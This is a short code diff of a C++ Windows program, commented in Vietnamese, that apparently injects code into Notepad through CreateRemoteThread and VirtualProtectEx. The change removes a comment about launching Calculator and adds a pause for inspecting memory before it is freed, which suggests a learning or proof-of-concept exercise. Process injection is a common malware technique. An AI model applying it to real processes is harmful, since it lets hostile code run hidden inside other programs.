@@ -107,7 +107,6 @@ int main() {
         HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);
 
         if (hThread) {
-            // Đợi luồng hoàn thành chu kỳ xử lý mở Máy tính, phá băng nghẽn luồng Windows 11
             WaitForSingleObject(hThread, INFINITE);
             std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu." << std::endl;
             CloseHandle(hThread);
@@ -119,6 +118,10 @@ int main() {
     else {
         std::cerr << "[-] VirtualProtectEx that bai! Ma loi: " << std::dec << GetLastError() << std::endl;
     }
+
+    // ── ĐƯA LỆNH DỪNG LÊN ĐÂY ĐỂ ĐÓNG BĂNG RAM TRƯỚC KHI GIẢI PHÓNG ──
+    std::cout << "\n[*] PAUSE: Checking memory layout inside Notepad now... Press Enter after verification." << std::endl;
+    std::cin.get();
 
     // ─── BƯỚC 5: GIẢI PHÓNG TÀI NGUYÊN CHỐNG MEMORY LEAK ───
     VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
